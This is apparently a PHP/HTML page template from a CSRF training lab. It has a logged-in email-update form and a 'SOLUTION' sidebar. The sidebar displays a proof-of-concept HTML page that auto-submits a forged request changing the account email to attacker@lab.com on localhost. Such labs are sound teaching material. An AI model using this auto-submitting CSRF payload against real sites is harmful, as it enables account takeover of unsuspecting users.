<?php if (session()->exists('login') && session()->get('login') === 'true'): ?>

    <!DOCTYPE html>
    <html lang="en">

    <head>
        <meta charset="UTF-8">
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <title>Workspace — CSRF Lab</title>
        <script src="https://cdn.tailwindcss.com"></script>
        <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600&display=swap" rel="stylesheet">
        <style>
            body {
                font-family: 'Inter', sans-serif;
            }

            /* ── Right sidebar ── */
            #solutionSidebar {
                width: 0;
                min-width: 0;
                overflow: hidden;
                transition: width 0.35s cubic-bezier(.4, 0, .2, 1),
                    min-width 0.35s cubic-bezier(.4, 0, .2, 1);
                background: #0a0d13;
                border-left: 1px solid rgba(74, 222, 128, 0.15);
                display: flex;
                flex-direction: column;
                flex-shrink: 0;
            }

            #solutionSidebar.open {
                width: 80.6%;
                min-width: 420px;
            }

            #solutionSidebar {
                position: fixed;
                top: 0;
                right: 0;
                width: 0;
                height: 100vh;
                z-index: 99999;
                overflow: hidden;
                transition: width .35s cubic-bezier(.4, 0, .2, 1);
                background: #0a0d13;
                border-left: 1px solid rgba(74, 222, 128, 0.15);
            }

            #solutionSidebar .inner {
                width: 100vw;
                min-width: 420px;
                height: 100%;
                display: flex;
                flex-direction: column;
            }

            /* ── Sol button states ── */
            #solBtn {
                transition: all 0.2s;

            }

            #solBtn:hover {
                background: rgba(34, 197, 94, 0.15) !important;
                border-color: rgba(34, 197, 94, 0.5) !important;
            }

            #solBtn.active {
                background: rgba(34, 197, 94, 0.18) !important;
                border-color: rgba(34, 197, 94, 0.6) !important;
                color: #86efac !important;
            }

            @keyframes fadeIn {
                from {
                    opacity: 0;
                }

                to {
                    opacity: 1;
                }
            }
        </style>
    </head>

    <body class="bg-[#090a0f] text-gray-200 min-h-screen flex selection:bg-white selection:text-black antialiased"
        style="overflow:hidden; height:100vh;">

        <!-- ── Left sidebar ── -->
        <aside
            class="w-64 bg-[#0e1017] border-r border-zinc-800/60 p-6 flex flex-col justify-between hidden md:flex shrink-0">
            <div class="space-y-8">
                <div class="text-xs font-bold tracking-widest text-zinc-500 uppercase">
                    CSRF Sandbox
                </div>

                <div
                    class="flex flex-col items-center text-center p-4 bg-zinc-900/30 border border-zinc-800/40 rounded-xl space-y-3">
                    <div class="relative">
                        <img class="w-16 h-16 rounded-full border border-zinc-700 object-cover bg-zinc-800"
                            src="img/hacker.png" alt="User profile photo">
                        <span
                            class="absolute bottom-0 right-0 block h-3 w-3 rounded-full bg-emerald-500 ring-2 ring-[#0e1017] shadow-[0_0_8px_#10b981]"></span>
                    </div>

                    <div class="space-y-0.5">
                        <div class="text-sm font-semibold text-white tracking-wide">
                            <?= \Src\Authentication\Auth::username(); ?>
                        </div>
                        <div class="text-xs text-zinc-500 font-mono"><?= \Src\Authentication\Auth::email() ?></div>
                    </div>
                </div>
            </div>

            <div class="pt-4 border-t border-zinc-900 text-center">
                <form action="/logout" method="post">
                    <input type="hidden" name="csrf" value="<?= session()->get('token')['csrf'] ?>">
                    <button type="submit" class="inline-flex items-center justify-center w-full px-4 py-2.5 rounded-lg
                    bg-red-500/10 border border-red-500/20
                    text-red-400 hover:bg-red-500 hover:text-white
                    font-medium text-sm transition-all duration-200">
                        Logout
                    </button>
                </form>
            </div>
        </aside>

        <!-- ── Main content ── -->
        <main class="flex-1 p-8 md:p-12 max-w-4xl mx-auto w-full flex flex-col overflow-y-auto">

            <div class="flex justify-between items-center mb-12 pb-4 border-b border-zinc-800/60">
                <div>
                    <h2 class="text-base font-semibold tracking-tight text-white">Lab Console Panel</h2>
                    <p class="text-xs text-zinc-500">CSRF Bypass by Omitting the CSRF Token</p>
                </div>
            </div>

            <div class="bg-[#0e1017] border border-zinc-800/80 rounded-xl p-6 md:p-8 shadow-2xl space-y-6">
                <div class="space-y-1.5">
                    <h3 class="text-sm font-semibold text-white tracking-wide">Account Parameter Context</h3>
                    <p class="text-sm text-zinc-400 font-normal leading-relaxed">
                        This administrative interface processes sensitive parameters state changes. Construct cross-origin
                        payloads pointing to this structure conforming to the structural criteria of your selected exploit
                        level.
                    </p>
                </div>

                <form id="form" action="/update-email" method="POST" class="space-y-4 max-w-md">
                    <input type="hidden" name="csrf" value="<?= session()->get('token')['csrf'] ?>">
                    <div class="space-y-1.5">
                        <label for="email" class="text-xs font-medium text-zinc-400 tracking-wide block">
                            Update Email
                        </label>
                        <input type="email" id="email" name="email" placeholder="the0x@lab.com" required autocomplete="off"
                            class="w-full px-3.5 py-2.5 bg-zinc-900/40 border border-zinc-800 rounded-lg text-white text-sm placeholder-zinc-700 focus:outline-none focus:border-zinc-500 focus:bg-zinc-900/80 transition-all">
                        <p id="updateEmail"
                            class="text-xs font-medium text-rose-400/90 pt-1.5 min-h-[1.25rem] empty:hidden transition-all duration-150 ease-in-out">
                        </p>
                    </div>

                    <div class="pt-2 flex items-center gap-3">
                        <button type="submit"
                            class="px-4 py-2 bg-white hover:bg-zinc-200 text-black font-semibold text-sm rounded-lg shadow-sm transition-colors duration-150">
                            Update Parameter
                        </button>

                        <button type="button" onclick="toggleSolution()" id="solBtn" style="display:inline-flex; align-items:center; gap:8px;
                               padding:8px 18px; border-radius:8px;
                               background:rgba(34,197,94,0.08); border:1px solid rgba(34,197,94,0.3);
                               color:#4ade80; font-size:13px; font-weight:600; cursor:pointer; letter-spacing:0.04em;">
                            <svg id="solIcon" xmlns="http://www.w3.org/2000/svg" width="14" height="14" viewBox="0 0 24 24"
                                fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round"
                                stroke-linejoin="round">
                                <polyline points="9 18 15 12 9 6"></polyline>
                            </svg>
                            SOLUTION
                        </button>
                    </div>
                </form>
            </div>

        </main>

        <!-- ── Right sidebar: Solution panel ── -->
        <div id="solutionSidebar">
            <div class="inner">

                <!-- header -->
                <div style="display:flex; align-items:center; gap:10px; padding:14px 16px;
                        background:#0a0d13; border-bottom:1px solid rgba(74,222,128,0.15); flex-shrink:0;">
                    <div style="display:flex; gap:6px;">
                        <span style="width:11px;height:11px;border-radius:50%;background:#ff5f57;display:block;"></span>
                        <span style="width:11px;height:11px;border-radius:50%;background:#febc2e;display:block;"></span>
                        <span style="width:11px;height:11px;border-radius:50%;background:#28c840;display:block;"></span>
                    </div>
                    <span
                        style="font-size:11px; color:#4ade80; font-family:monospace; margin-left:4px; letter-spacing:0.05em; white-space:nowrap;">
                        exploit.html — CSRF Bypass by Omitting the CSRF Token
                    </span>
                    <button onclick="toggleSolution()" title="Close" style="margin-left:auto;margin-right:260px; background:transparent; border:none;
                           color:#6b7280; cursor:pointer; font-size:18px; line-height:1; padding:0 2px;">
                        &times;
                    </button>
                </div>

                <!-- code block -->
                <div style="flex:1; overflow-y:auto; overflow-x:auto;">
                    <pre id="codeBlock" style="margin:0; padding:20px 22px;
                     font-family:'Fira Code','Cascadia Code',monospace; font-size:13px;
                     line-height:1.85; color:#d4d4d4; background:#0e1017;
                     white-space:pre; direction:ltr; text-align:left; min-height:100%;"></pre>
                </div>

                <!-- footer -->
                <div style="padding:10px 16px 14px; border-top:1px solid rgba(255,255,255,0.05);
                        display:flex; align-items:center; justify-content:space-between; flex-shrink:0;
                        background:#0a0d13;">
                    <span style="font-size:11px; color:#6b7280; font-family:monospace;">
                        &#9432;&nbsp; Lab created by <span style="color:#4ade80;">The0x</span>
                    </span>
                    <button onclick="copyCode()" style="margin-right:260px;display:inline-flex; align-items:center; gap:5px; padding:5px 12px;
                           border-radius:6px; background:rgba(74,222,128,0.08);
                           border:1px solid rgba(74,222,128,0.25); color:#4ade80;
                           font-size:11px; font-family:monospace; cursor:pointer; white-space:nowrap;">
                        &#10697; <span id="copyLabel">copy</span>
                    </button>
                </div>

            </div>
        </div>

        <script>
            // ─── Render code block via JS (prevents formatter whitespace issues) ───
            var lines = [
                '<span style="color:#6a9955;">&lt;!--</span>',
                '<span style="color:#6a9955;">    CSRF Lab Demonstration</span>',
                '<span style="color:#6a9955;"></span>',
                '<span style="color:#6a9955;">    Create a legitimate email change request and intercept it.</span>',
                '<span style="color:#6a9955;">    Convert the request into a CSRF proof-of-concept using the lab tooling.</span>',
                '<span style="color:#6a9955;">    The CSRF token used in this request must be fresh and unused.</span>',
                '<span style="color:#6a9955;">    Since tokens are single-use, a previously consumed token will fail validation.</span>',
                '<span style="color:#6a9955;">--&gt;</span>',

                '<span style="color:#569cd6;">&lt;!DOCTYPE html&gt;</span>',
                '<span style="color:#569cd6;">&lt;html</span> <span style="color:#9cdcfe;">lang</span>=<span style="color:#ce9178;">"en"</span><span style="color:#569cd6;">&gt;</span>',
                '<span style="color:#569cd6;">&lt;head&gt;</span>',
                '    <span style="color:#569cd6;">&lt;meta</span> <span style="color:#9cdcfe;">charset</span>=<span style="color:#ce9178;">"UTF-8"</span><span style="color:#569cd6;">&gt;</span>',
                '    <span style="color:#569cd6;">&lt;title&gt;</span>CSRF Exploit PoC<span style="color:#569cd6;">&lt;/title&gt;</span>',
                '<span style="color:#569cd6;">&lt;/head&gt;</span>',
                '<span style="color:#569cd6;">&lt;body&gt;</span>',

                '    <span style="color:#569cd6;">&lt;form</span> <span style="color:#9cdcfe;">id</span>=<span style="color:#ce9178;">"csrfForm"</span> <span style="color:#9cdcfe;">action</span>=<span style="color:#ce9178;">"http://localhost/update-email"</span> <span style="color:#9cdcfe;">method</span>=<span style="color:#ce9178;">"POST"</span><span style="color:#569cd6;">&gt;</span>',

                '        <span style="color:#569cd6;">&lt;input</span> <span style="color:#9cdcfe;">type</span>=<span style="color:#ce9178;">"hidden"</span> <span style="color:#9cdcfe;">name</span>=<span style="color:#ce9178;">"csrf"</span> <span style="color:#9cdcfe;">value</span>=<span style="color:#ce9178;">"TOKEN_ATTACKER"</span><span style="color:#569cd6;">&gt;</span>',

                '        <span style="color:#569cd6;">&lt;input</span> <span style="color:#9cdcfe;">type</span>=<span style="color:#ce9178;">"hidden"</span> <span style="color:#9cdcfe;">name</span>=<span style="color:#ce9178;">"email"</span> <span style="color:#9cdcfe;">value</span>=<span style="color:#ce9178;">"attacker@lab.com"</span> <span style="color:#569cd6;">/&gt;</span>',

                '    <span style="color:#569cd6;">&lt;/form&gt;</span>',

                '    <span style="color:#569cd6;">&lt;script&gt;</span>',
                '        document.getElementById(<span style="color:#ce9178;">\'csrfForm\'</span>).submit();',
                '    <span style="color:#569cd6;">&lt;/script&gt;</span>',

                '<span style="color:#569cd6;">&lt;/body&gt;</span>',
                '<span style="color:#569cd6;">&lt;/html&gt;</span>'
            ];
            document.getElementById('codeBlock').innerHTML = lines.join('\n');

            // ─── Toggle right sidebar ───
            function toggleSolution() {
                var sidebar = document.getElementById('solutionSidebar');
                var btn = document.getElementById('solBtn');
                var icon = document.getElementById('solIcon');
                var isOpen = sidebar.classList.contains('open');

                if (isOpen) {
                    sidebar.classList.remove('open');
                    btn.classList.remove('active');
                    icon.innerHTML = '<polyline points="9 18 15 12 9 6"></polyline>';
                } else {
                    sidebar.classList.add('open');
                    btn.classList.add('active');
                    icon.innerHTML = '<polyline points="15 18 9 12 15 6"></polyline>';
                }
            }

            // ─── Email form validation ───
            var form = document.querySelector('#form');
            form.addEventListener('submit', function (e) {
                var is_valid = true;
                var email = document.querySelector('#email').value;
                var updateEmail = document.querySelector('#updateEmail');
                if (email.length < 7) {
                    updateEmail.textContent = 'email required';
                    is_valid = false;
                } else {
                    updateEmail.textContent = '';
                }
                if (!is_valid) { e.preventDefault(); }
            });
        </script>

    </body>

    </html>
<?php else: ?>
    <?php response()->redirect('/'); ?>
<?php endif; ?>